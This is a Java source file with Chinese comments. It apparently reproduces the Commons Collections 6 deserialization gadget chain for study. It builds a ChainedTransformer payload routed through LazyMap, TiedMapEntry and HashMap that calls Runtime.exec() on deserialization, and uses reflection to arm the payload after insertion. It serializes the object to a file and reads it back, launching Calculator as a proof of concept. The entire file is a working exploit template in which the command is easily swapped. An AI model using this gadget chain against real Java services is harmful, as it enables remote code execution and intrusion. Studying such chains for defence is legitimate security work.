import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author yhy
 * @date 2021/6/27 11:41
 * @github https://github.com/yhy0
 */
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashMap.readObject()     这里不同
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
*/

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        // 人畜无害的Transformer数组
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1), // 隐藏错误信息
        };
        //将 fakeTransformers 数组存入 ChainedTransformer 这个继承类
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        //使用 LazyMap
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);

        // 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"yhy");
//        tiedMapEntry.hashCode();

//        // HashMap 自动触发
        HashMap hashMap = new HashMap();

        hashMap.put(tiedMapEntry, "yhy");

        // put 后再把key去除，防止影响后续执行
        outerMap.remove("yhy");

        // 反射加入加入payload ,这样在put时就不会执行
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);

        // 反序列化读取 out.bin 文件
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();

    }
}
